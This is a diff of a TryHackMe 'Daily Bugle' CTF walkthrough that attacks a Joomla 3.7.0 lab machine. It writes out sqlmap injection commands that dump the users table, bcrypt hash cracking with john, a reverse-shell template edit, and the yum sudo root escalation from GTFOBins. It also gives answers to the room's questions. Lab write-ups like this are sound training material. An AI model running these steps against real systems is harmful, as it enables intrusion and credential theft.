@@ -9,22 +9,22 @@ Room Link: [https://tryhackme.com/room/dailybugle](https://tryhackme.com/room/da
 
 ## Tools 
 
-1. NMap https://nmap.org/download
-2. JoomScan https://github.com/OWASP/joomscan
-3. SearchSploit https://www.exploit-db.com/searchsploit
-4. SQLMap https://github.com/sqlmapproject/sqlmap
-5. hashid https://pypi.org/project/hashID/
-6. John The Ripper https://www.openwall.com/john/
+- NMap https://nmap.org/download
+- JoomScan https://github.com/OWASP/joomscan
+- SearchSploit https://www.exploit-db.com/searchsploit
+- SQLMap https://github.com/sqlmapproject/sqlmap
+- hashid https://pypi.org/project/hashID/
+- John The Ripper https://www.openwall.com/john/
 
 ## Deploy 
 
-1. Start the machine and open the ip in browser.
-2. Opening the site shows favicon of joomla on main page and a image with a man masked as spider man, looks like an robber.
-3. Question `Access the web server, who robbed the bank?` Answer `spiderman`
+- Start the machine and open the ip in browser.
+- Opening the site shows favicon of joomla on main page and a image with a man masked as spider man, looks like an robber.
+- Question `Access the web server, who robbed the bank?` Answer `spiderman`
 
 ## Obtain user and root
 
-1. Running nmap gives some ports.
+- Running nmap gives some ports.
 ```bash
 nmap -A 10.10.250.153
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-05 11:33 IST
@@ -50,10 +50,10 @@ PORT     STATE SERVICE VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 38.97 seconds
 ```
-2. Question `What is the Joomla version?` Answer `3.7.0`
+- Question `What is the Joomla version?` Answer `3.7.0`
 Got this details using OWASP joomscan by Mohammad Reza Espargham , Ali Razmjoo.
 Command used: `joomscan  -u http://10.10.250.153/`
-4. Using SearchSploit by exploitDB gives us SQL injection exploits on this joomla CMS version.
+- Using SearchSploit by exploitDB gives us SQL injection exploits on this joomla CMS version.
 ```bash
 searchsploit joomla 3.7.0
 ---------------------------------------------- ---------------------------------
@@ -65,12 +65,12 @@ Joomla! Component Easydiscuss < 4.0.21 - Cros | php/webapps/43488.txt
 Shellcodes: No Results
 
 ```
-5. After some reasearch on the exploit https://www.exploit-db.com/exploits/42033 and using some commands in SQLMap,
+- After some reasearch on the exploit https://www.exploit-db.com/exploits/42033 and using some commands in SQLMap,
 At first we crafted a command to begin SQL injection `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E`
-6. Then crafted a SQLMap command to get db names `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E --dbs` and got a database named `joomla`
-7. Then crafted a command to table names on DB `joomla` command `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E -D joomla --tables` and we will get a table named `#__users`
-8. To extract the table column names, we can use this command, `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E -D joomla -T "#__users" --columns` it will prompt for bruteforcing existing column names, we can find some column names like `id`, `username`, `email`, `password` etc.
-9. Then, crafted a command to get password hash of users. `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E -D joomla -T "#__users" -C id,name,username,email,password --dump`
+- Then crafted a SQLMap command to get db names `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E --dbs` and got a database named `joomla`
+- Then crafted a command to table names on DB `joomla` command `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E -D joomla --tables` and we will get a table named `#__users`
+- To extract the table column names, we can use this command, `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E -D joomla -T "#__users" --columns` it will prompt for bruteforcing existing column names, we can find some column names like `id`, `username`, `email`, `password` etc.
+- Then, crafted a command to get password hash of users. `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E -D joomla -T "#__users" -C id,name,username,email,password --dump`
 It shows result like that,
 ```bash
 +-----+------------+----------+---------------------+--------------------------------------------------------------+
@@ -79,7 +79,7 @@ It shows result like that,
 | 811 | Super User | jonah    | jonah@tryhackme.com | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
 +-----+------------+----------+---------------------+--------------------------------------------------------------+
 ```
-10. We used `hashid` to detect hash type and it could be `bcrypt`.
+- We used `hashid` to detect hash type and it could be `bcrypt`.
 ```bash
 hashid '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
 Analyzing '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
@@ -87,7 +87,7 @@ Analyzing '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
 [+] Woltlab Burning Board 4.x 
 [+] bcrypt
 ```
-11. Now we can use `john the ripper` to decrypt the hash, using `rockyou.txt` wordlist.
+- Now we can use `john the ripper` to decrypt the hash, using `rockyou.txt` wordlist.
 ```bash
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
 Using default input encoding: UTF-8
@@ -100,11 +100,11 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
-12. Question `What is Jonah's cracked password?` Answer `spiderman123`
-13. Now we can login using username `jonah` and password `spiderman123` on http://10.10.250.153/administrator/.
-14. Now just goto `Extensions` > `Templates` > `Templates` and select `Beez3` and edit the `index.php` file to get reverse shell.
-15. Now started  `netcat` with `nc -lvnp 1234` and replaced the code in `index.php` with pentestmonkey shell with own ip port and save.
-16. Opening http://10.10.250.153/templates/beez3/index.php will give shell.
+- Question `What is Jonah's cracked password?` Answer `spiderman123`
+- Now we can login using username `jonah` and password `spiderman123` on http://10.10.250.153/administrator/.
+- Now just goto `Extensions` > `Templates` > `Templates` and select `Beez3` and edit the `index.php` file to get reverse shell.
+- Now started  `netcat` with `nc -lvnp 1234` and replaced the code in `index.php` with pentestmonkey shell with own ip port and save.
+- Opening http://10.10.250.153/templates/beez3/index.php will give shell.
 ```bash
 nc -nlvp 1234
 Listening on 0.0.0.0 1234
@@ -114,9 +114,9 @@ Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_6
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=48(apache) gid=48(apache) groups=48(apache)
 ```
-17. We can see only user named `jjameson` with command `ls /home`.
-18. After some digging we got some password `*************` inside `/var/www/html/configuration.php` using `cat /var/www/html/configuration.php`.
-19. So used the password to login ssh as user `jjameson` and got the flag
+- We can see only user named `jjameson` with command `ls /home`.
+- After some digging we got some password `*************` inside `/var/www/html/configuration.php` using `cat /var/www/html/configuration.php`.
+- So used the password to login ssh as user `jjameson` and got the flag
 ```bash ssh jjameson@10.10.250.153
 The authenticity of host '10.10.250.153 (10.10.250.153)' can't be established.
 ED25519 key fingerprint is SHA256:Gvd5jH4bP7HwPyB+lGcqZ+NhGxa7MKX4wXeWBvcBbBY.
@@ -128,8 +128,8 @@ Last login: Tue Mar  5 04:27:31 2024
 [jjameson@dailybugle ~]$ cat /home/jjameson/user.txt
 **************************
 ```
-20. Question `What is the user flag?` Answer `**************************`
-21. Using `sudo -l` command shows `/usr/bin/yum`.
+- Question `What is the user flag?` Answer `**************************`
+- Using `sudo -l` command shows `/usr/bin/yum`.
 ```bash
 sudo -l
 Matching Defaults entries for jjameson on dailybugle:
@@ -144,8 +144,8 @@ Matching Defaults entries for jjameson on dailybugle:
 User jjameson may run the following commands on dailybugle:
     (ALL) NOPASSWD: /usr/bin/yum
 ```
-22. Lets follow https://gtfobins.github.io/gtfobins/yum/ sudo exploit to get root.
-23. Just copy pasting given commands in `b` will upgrade ssh to `root`
+- Lets follow https://gtfobins.github.io/gtfobins/yum/ sudo exploit to get root.
+- Just copy pasting given commands in `b` will upgrade ssh to `root`
 ```bash
 TF=$(mktemp -d)
 cat >$TF/x<<EOF
@@ -171,17 +171,17 @@ EOF
 
 sudo yum -c $TF/x --enableplugin=y
 ```
-24. So typing `cat /root/root.txt` will give us root flag.
+- So typing `cat /root/root.txt` will give us root flag.
 ```bash
 sh-4.2# id
 uid=0(root) gid=0(root) groups=0(root)
 sh-4.2# cat /root/root.txt
 ******************************
 ```
-25. Question `What is the root flag?` Answer `**************************`
+- Question `What is the root flag?` Answer `**************************`
 
 ## Credits
 
-1. We already completed the machine, just click on completed.
+- We already completed the machine, just click on completed.
 
 Author: [Zishan Ahamed Thandar](https://ZishanAdThandar.github.io)
